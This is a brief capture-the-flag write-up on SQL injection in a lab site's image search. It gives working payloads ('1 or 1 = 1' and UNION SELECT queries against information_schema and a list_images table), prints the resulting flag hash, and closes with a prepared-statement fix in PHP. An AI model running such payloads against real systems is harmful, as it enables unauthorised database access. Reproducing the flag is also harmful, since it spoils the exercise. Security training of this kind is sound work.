# EXPLANATION

In the images search page 

We can get all the images by searching "1 or 1 = 1"

By using UNION we can try to get more crucial information from **information_schema** which is a DB  used to store details of other databases on the server.

To get all the columns of the images table:
`1 or 1 = 1 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns`
The images table is called "list_images" with the columns: id, url, title, comment

After knowing the images table columns, the most important query is:
`1 or 1 = 1 UNION SELECT url,comment FROM list_images`
It contains an instruction 

We decrypt the md5 string and it gives "albatroz" after lowering all the chars and then encrypting using SH256 we get the flag:
===> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Utility

Get important infos from the DB. And understand the database construction.

# HOW TO AVOID ?

**Use prepared statements and parameterized queries** These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL.
Example using PDO:

    ```PHP
    $stmt = $pdo->prepare('SELECT * FROM images WHERE title = :title');

    $stmt->execute([ 'title' => $title ]);

    foreach ($stmt as $row) {
        // Do something with $row
    }
    ```